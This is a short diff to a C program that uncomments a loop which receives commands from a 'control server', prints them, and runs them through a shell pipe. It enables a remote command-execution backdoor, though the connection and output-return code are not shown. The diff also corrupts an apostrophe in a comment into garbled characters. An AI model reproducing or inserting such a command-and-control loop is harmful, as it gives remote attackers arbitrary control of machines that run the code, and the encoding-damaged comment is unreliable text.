@@ -73,7 +73,7 @@ int main(int argc , char *argv[])
     }
 
     puts("Connected");
-/*
+
     while(1)
     {
         // receive the control server's command
@@ -85,7 +85,7 @@ int main(int argc , char *argv[])
                 return 1;
             }
         } else {
-            // add a NULL terminating character to the end of `cmd` buffer to make it a proper string (won’t print properly without it)
+            // add a NULL terminating character to the end of `cmd` buffer to make it a proper string (wonâ€™t print properly without it)
             cmd[recv_size] = '\0';
 
             puts(cmd);
@@ -105,6 +105,6 @@ int main(int argc , char *argv[])
         }
         pclose(out_fp);
     }
-*/
+
     return 0;
 }
